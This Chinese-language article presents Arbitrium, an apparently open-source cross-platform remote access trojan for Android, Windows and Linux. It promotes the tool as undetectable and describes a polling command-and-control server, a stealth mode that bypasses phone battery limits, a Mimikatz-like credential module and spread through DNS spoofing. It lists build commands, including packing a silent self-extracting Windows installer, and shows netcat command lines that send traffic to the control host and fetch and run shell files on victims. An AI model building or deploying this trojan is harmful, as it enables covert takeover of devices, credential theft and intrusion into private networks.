![](https://image.3001.net/images/20210210/1612950549_6023ac15b1ca8b5e01550.png!small)  

## 关于Arbitrium

Arbitrium是一款跨平台并且完全无法被检测到的远程访问木马，可以帮助广大研究人员控制Android、Windows和Linux操作系统，而且完全不需要配置任何额外的防火墙规则或端口转发规则。该工具可以提供本地网络的访问权，我们可以将目标设备当作一个HTTP代理来使用，并访问目标网络中的路由器、发现本地IP或扫描目标端口等等。

Arbitrium还自带了类似Mimikatz的模块，而且支持广大研究人员添加自定义模块。除此之外，如果将Arbitrium配合一款DNS欺骗软件一起使用的话，就可以实现在目标网络设备之间实现木马后门的自动传播。Arbitrium是一个由多个部分组成的项目，并且使用了Java、JS、C、Python、Cordova和VueJS等多种编程语言进行开发。

## 功能介绍

### 完全无法被检测到（FUD）

客户端使用了简单的工具，这将允许Arbitrium完全无法被检测到。木马基于netcat通信，该组件主要负责通过管道处理TCP通信数据并运行服务器端发送过来的命令。

### 防火墙

Arbitrium不需要向防火墙添加任何的排除规则或端口转发规则，服务器端是一个带有API的终端节点，负责针对目标主机和其他设备的任务接收，因为木马每隔一段时间就会定期向服务器请求新的控制指令。这里的控制命令可以是一个JavaScript文件（Android应用使用的是Cordova）或可以在命令行终端中运行的Shell文件。当服务器端接收到目标设备的任务之后，前者将设置一个计划任务，然后开启一个子进程监听一个专用的临时端口并等待木马后门的响应。因此，我们的木马程序并不需要监听任何的端口。

### 电池优化/隐蔽模式

跟普通Android操作系统不同的是，小米的MIUI、华为的EMUI或三星的Android
Pie等定制产品忽略了用户对应用程序的权限/例外。因此，如果你尝试在后台运行Android端木马后门，当应用程序开始运行频繁或繁重（有时甚至是轻量级）任务（例如：定期发送HTTP请求）时，无论用户授予什么权限，它都会被终止运行，而且操作系统完全忽略当前的配置。

上面提到的这个问题非常烦人，但经过一段时间的研究后我发现，我们可以通过构建一个轻量级的二进制文件，在后台继续运行分配的任务，而MainActivity在启动二进制文件之后就不会有什么动静了，这样可以帮助我们绕过绝大多数限制，而且还可以提高应用程序的性能。

MainActivity从服务器接收一个JS文件，并使用ThreadPoolExecutor启动二进制文件，而无需挂起二进制文件以使其退出（有关此
_StealthMode/BatteryBypass_的详细信息）。

### Web接口

该工具还提供了一个控制面板，这个Web接口只是一个可选项，并非必须的。这是一个简单的VueJS
Web应用程序，即一个可以帮助我们控制目标的UI界面，而不用通过给API发送命令请求来实现控制。【[
_点我_](https://github.com/BenChaliah/Arbitrium-WebApp)】访问Arbitrium WebApp。

## 工具要求

### Android客户端

    
    
    Java ver ...
    
    Cordova
    
    Android SDK & NDK

### Windows/Linux客户端

    
    
    Python3.6 （或更新版本）
    
    PyInquirer
    
    Winrar （Windows only）

## 项目构建

注意：需要使用setAPI_FQDN.sh设置所有文件中的服务器域名/IP地址。

使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/BenChaliah/Arbitrium-RAT.git --recursive

### Android

    
    
    $ cd ArbitriumClients/AndroidApp/ClientApp/
    
    $ cordova build android
    
    $ cd ../StealthMode/
    
    $ make clean && make build

### Windows

    
    
    $ cd ArbitriumClients\WindowsApp
    
    $ pyinstaller --onefile runFrame.py
    
    $ copy Client_tools\toolbox.exe dist\
    
    $ copy Client_tools\SFXAutoInstaller.conf dist\
    
    $ copy Client_tools\start_script.vbs dist\
    
    $ cd dist
    
    $ {Rar_abspath} a -r -cfg -sfx -z"SFXAutoInstaller.conf" Standalone.exe

## 组件

### 服务器API

    
    
    $ pip install flask flask_cors && ./runserver.sh # Python2.7
    
    
    ├── runserver.sh
    
    ├── main.py
    
    ├── reverse_http.py
    
    ├── initProxy.py
    
    │
    
    ├── assets (src: ArbitriumClients/AndroidApp/StealthMode)
    
    │   ├── runFrame_arm64-v8a
    
    │   ├── toolbox_arm64-v8a
    
    │   ├── ... (x86, x86_64, armeabi-v7a)
    
    │
    
    │
    
    ├── JS_scripts
    
    │   ├── checkupdate.js
    
    │   ├── init.js
    
    │   ├── runshell.js
    
    │   └── StealthMode.js
    
    │
    
    ├── misc
    
    │
    
    ├── modules
    
    │   ├── discover.py
    
    │   ├── mimikatz.py
    
    │   ├── ports.py
    
    │   └── runCMD.py
    
    │
    
    └── threads

### 终端节点

 **[GET] /checkupdate.js**

样例：假设你想要将目标以HTTP代理来使用，API会将请求构建为下列命令：

    
    
    echo -e "GET / HTTP/1.1\r\nHost: 192.168.1.1\r\nConnection: close\r\n\r\n" | {abspath_toolbox/ncat} {API_HOST_IP} {lport} -w 10;\r\n

然后将其存储至assets/runsh_{uid_task}.sh中，/checkupdate.js会让木马下载并执行shell文件：

    
    
    >>> Popen("exec $(nc -l 0.0.0.0 -p {lport} -dN > {task_filename})" shell=True, close_fds=True, ...)

## 工具运行截图

![](https://image.3001.net/images/20210210/1612950807_6023ad171f1e9c5eeeb2a.png!small)

### HTTP代理

![](https://image.3001.net/images/20210210/1612950817_6023ad215878af70509c4.png!small)

### PowerShell

![](https://image.3001.net/images/20210210/1612950827_6023ad2b0af42ff6e5f4d.png!small)

### 端口扫描

![](https://image.3001.net/images/20210210/1612950837_6023ad35d0228d028b4f8.png!small)

## 工具演示视频

视频地址：[ _https://油管/7KlPPND2b0g_](https://xn--uvwy13a/7KlPPND2b0g)

## 项目地址

Arbitrium：【[ _GitHub传送门_](https://github.com/BenChaliah/Arbitrium-RAT)】

